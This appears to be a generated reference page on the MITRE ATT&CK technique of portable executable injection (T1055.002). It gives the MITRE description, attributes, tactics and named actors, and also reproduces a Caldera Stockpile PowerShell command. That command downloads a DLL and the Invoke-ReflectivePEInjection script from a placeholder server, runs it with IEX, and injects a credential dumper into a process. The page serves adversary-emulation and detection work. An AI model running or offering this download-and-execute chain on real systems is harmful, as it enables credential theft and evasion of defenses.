
# Portable Executable Injection

## Description

### MITRE Description

> Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. 

PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Endgame Process Injection July 2017) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. 

## Aliases

```

```

## Additional Attributes

* Bypass: ['Anti-virus', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1055/002

## Potential Commands

```
$url="#{server}/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("file","debugger.dll");
$PBytes = $wc.DownloadData($url);
$wc1 = New-Object System.net.webclient;
$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
IEX ($wc1.DownloadString($url));
Invoke-ReflectivePEInjection -PBytes $PBytes -verbose
```

## Commands Dataset

```
[{'command': '$url="#{server}/file/download";\n'
             '$wc=New-Object System.Net.WebClient;\n'
             '$wc.Headers.add("file","debugger.dll");\n'
             '$PBytes = $wc.DownloadData($url);\n'
             '$wc1 = New-Object System.net.webclient;\n'
             '$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\n'
             'IEX ($wc1.DownloadString($url));\n'
             'Invoke-ReflectivePEInjection -PBytes $PBytes -verbose',
  'name': 'Injects cred dumper exe into an available process',
  'source': 'data/abilities/credential-access/c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7.yml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Injects cred dumper exe into an available process': {'description': 'Injects '
                                                                                         'cred '
                                                                                         'dumper '
                                                                                         'exe '
                                                                                         'into '
                                                                                         'an '
                                                                                         'available '
                                                                                         'process',
                                                                          'id': 'c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7',
                                                                          'name': 'Inject '
                                                                                  'Cred '
                                                                                  'dumper '
                                                                                  'into '
                                                                                  'process '
                                                                                  '(Spookier)',
                                                                          'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                                                                                                       '$wc=New-Object '
                                                                                                                       'System.Net.WebClient;\n'
                                                                                                                       '$wc.Headers.add("file","debugger.dll");\n'
                                                                                                                       '$PBytes '
                                                                                                                       '= '
                                                                                                                       '$wc.DownloadData($url);\n'
                                                                                                                       '$wc1 '
                                                                                                                       '= '
                                                                                                                       'New-Object '
                                                                                                                       'System.net.webclient;\n'
                                                                                                                       '$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\n'
                                                                                                                       'IEX '
                                                                                                                       '($wc1.DownloadString($url));\n'
                                                                                                                       'Invoke-ReflectivePEInjection '
                                                                                                                       '-PBytes '
                                                                                                                       '$PBytes '
                                                                                                                       '-verbose'}}},
                                                                          'tactic': 'credential-access',
                                                                          'technique': {'attack_id': 'T1055.002',
                                                                                        'name': 'Process '
                                                                                                'Injection: '
                                                                                                'Portable '
                                                                                                'Executable '
                                                                                                'Injection'}}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [Behavior Prevention on Endpoint](../mitigations/Behavior-Prevention-on-Endpoint.md)


# Actors


* [Gorgon Group](../actors/Gorgon-Group.md)

* [Rocke](../actors/Rocke.md)
    
